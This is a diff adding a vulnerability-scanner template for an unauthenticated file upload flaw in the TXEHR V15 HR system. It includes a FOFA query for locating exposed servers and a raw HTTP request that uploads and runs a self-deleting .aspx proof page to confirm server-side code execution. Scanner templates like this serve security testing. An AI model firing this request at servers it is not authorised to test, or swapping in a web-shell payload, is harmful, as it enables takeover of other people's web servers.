@@ -1,0 +1,48 @@
+id: tongxiangHR-TXEHR_V15_UploadHandler-File-upload
+
+info:
+  name: 同享人力资源管理系统-TXEHR V15 UploadHandler.ashx 接口任意文件上传漏洞
+  author: Unknown
+  severity: high
+  description: |-
+    fofa: body="/Assistant/Default.aspx"
+      同享人力资源管理系统-TXEHR V15版本的UploadHandler.ashx接口存在未经身份验证的任意文件上传缺陷。攻击者可远程利用此缺陷上传恶意文件，导致服务器端代码执行，最终可能实现对Web服务器的完全控制。
+  reference:
+  - https://blog.csdn.net/m0_60571842/article/details/140985569
+  tags: 同享人力资源管理系统
+
+variables:
+  username: "{{to_lower(rand_base(6))}}"
+http:
+- raw:
+  - |
+    POST /Handler/UploadHandler.ashx?folder=Uploadfile2 HTTP/1.1
+    Host: {{Hostname}}
+    Content-Type: multipart/form-data;boundary =---------------------------142851345723692939351758052805
+
+    -----------------------------142851345723692939351758052805
+    Content-Disposition: form-data; name="Filedata"; filename="{{username}}.aspx"
+    Content-Type: text/plain
+
+    <%@Page Language="C#"%><%Response.Write("pboyjnnrfipmplsukdeczudsefxmywe");System.IO.File.Delete(Request.PhysicalPath);%>
+    -----------------------------142851345723692939351758052805--
+
+  - |
+    GET /Handler/Uploadfile2/{{username}}.aspx HTTP/1.1
+    Host: {{Hostname}}
+
+
+  matchers-condition: and
+  matchers:
+  - type: word
+    part: body
+    words:
+    - 'pboyjnnrfipmplsukdeczudsefxmywe'
+  - type: status
+    status:
+    - 200
+
+
+
+
+
